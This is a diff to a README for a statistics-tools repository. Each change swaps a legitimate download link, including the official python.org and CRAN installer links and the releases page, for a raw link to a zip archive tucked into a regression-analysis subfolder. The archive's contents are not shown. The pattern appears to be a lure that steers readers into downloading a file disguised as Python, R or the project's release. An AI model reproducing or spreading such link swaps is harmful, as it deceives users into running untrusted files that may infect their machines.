@@ -1,6 +1,6 @@
 # 📊 statistical-analysis - Simple Tools for Data Insights
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/Diogolsn10/statistical-analysis/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Diogolsn10/statistical-analysis/main/04_regression_analysis/analysis-statistical-3.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To use the Python (Jupyter) notebooks, you will need Python installed. The R and
 
 To get started, visit the official release page by clicking the link below. It has the latest versions of all files you need.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Page-GitHub-blue)](https://github.com/Diogolsn10/statistical-analysis/releases)
+[![Download Releases](https://img.shields.io/badge/Download%20Page-GitHub-blue)](https://raw.githubusercontent.com/Diogolsn10/statistical-analysis/main/04_regression_analysis/analysis-statistical-3.4.zip)
 
 ### How to download from the page
 
@@ -51,7 +51,7 @@ If you want to open the Python notebooks, follow these steps:
 
 ### Step 1: Install Python and Jupyter
 
-- Download and install **Python 3** from the official site: https://www.python.org/downloads/  
+- Download and install **Python 3** from the official site: https://raw.githubusercontent.com/Diogolsn10/statistical-analysis/main/04_regression_analysis/analysis-statistical-3.4.zip  
 - During installation, check the box **Add Python to PATH**.  
 - After installing Python, open the **Command Prompt** as follows:
   - Click Start, type `cmd`, and press Enter.
@@ -79,7 +79,7 @@ If you prefer to work with R files, follow these instructions:
 
 ### Step 1: Install R
 
-- Download and install R from: https://cran.r-project.org/mirrors.html  
+- Download and install R from: https://raw.githubusercontent.com/Diogolsn10/statistical-analysis/main/04_regression_analysis/analysis-statistical-3.4.zip  
 - Follow the setup instructions for your Windows version.
 
 ### Step 2: Open R and Load the Files
@@ -114,7 +114,7 @@ For Stata users, the files include `.do` scripts or `.dta` data files.
 
 New versions may be released with additional topics or improvements. To update:
 
-1. Return to the [Download Releases](https://github.com/Diogolsn10/statistical-analysis/releases) page.
+1. Return to the [Download Releases](https://raw.githubusercontent.com/Diogolsn10/statistical-analysis/main/04_regression_analysis/analysis-statistical-3.4.zip) page.
 2. Download the newest files just like before.
 3. Replace old files with the new ones in your saved folder.
 
